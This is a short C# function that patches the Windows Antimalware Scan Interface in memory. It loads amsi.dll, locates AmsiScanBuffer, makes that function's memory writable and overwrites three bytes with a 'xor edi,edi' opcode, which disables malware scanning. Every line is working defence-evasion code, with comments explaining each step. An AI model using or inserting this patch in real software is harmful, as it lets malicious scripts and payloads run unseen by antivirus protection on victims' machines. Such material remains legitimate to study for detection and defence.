public static string run()
{
IntPtr dllHandle = LoadLibrary("amsi.dll"); //load the amsi.dll
if (dllHandle == null) return "error";

//Get the AmsiScanBuffer function address
IntPtr AmsiScanbufferAddr = GetProcAddress(dllHandle, "AmsiScanBuffer");
if (AmsiScanbufferAddr == null) return "error";

IntPtr OldProtection = Marshal.AllocHGlobal(4); //pointer to store the current AmsiScanBuffer memory protection

//Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
bool VirtualProtectRc = VirtualProtect(AmsiScanbufferAddr, 0x0015, 0x40, OldProtection);
if (VirtualProtectRc == false) return "error";

//The new patch opcode
var patch = new byte[] {0x31,0xff,0x90};

//Setting a pointer to the patch opcode array (unmanagedPointer)
IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
Marshal.Copy(patch, 0, unmanagedPointer,3);

//Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);

return "OK";

}
